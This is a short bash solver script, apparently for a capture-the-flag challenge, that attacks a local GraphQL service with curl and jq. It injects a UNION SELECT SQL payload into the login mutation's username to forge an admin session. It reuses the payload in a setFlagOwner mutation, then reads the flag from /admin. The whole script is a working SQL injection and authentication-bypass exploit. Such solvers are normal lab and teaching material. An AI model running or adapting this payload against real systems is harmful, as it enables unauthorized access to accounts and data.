
#!/usr/bin/env bash
# Quick-and-dirty solver using curl + jq
# Usage: ./solve.sh http://127.0.0.1:31349

set -euo pipefail
BASE="${1:-http://127.0.0.1:31349}"

inj="' UNION SELECT 'admin','admin',1;--"
login='mutation ($username: String!, $password: String!){ login(username:$username, password:$password){ token } }'
vars=$(jq -n --arg u "$inj" --arg p "admin" '{username:$u,password:$p}')
token1=$(curl -s "$BASE/graphql" -H 'Content-Type: application/json' --data-binary "$(jq -c --arg q "$login" --argjson v "$vars" '{query:$q,variables:$v}')" | jq -r '.data.login.token')

setQ='mutation ($u: String!){ setFlagOwner(username:$u) }'
vars2=$(jq -n --arg u "$inj" '{u:$u}')
token2=$(curl -s "$BASE/graphql" -H 'Content-Type: application/json' -H "Authorization: Bearer $token1" --data-binary "$(jq -c --arg q "$setQ" --argjson v "$vars2" '{query:$q,variables:$v}')" | jq -r '.data.setFlagOwner')

echo "[+] token1: ${token1:0:64}..."
echo "[+] token2: ${token2:0:64}..."
echo "[+] FLAG:"
curl -s "$BASE/admin" -H "Authorization: Bearer $token2"
echo
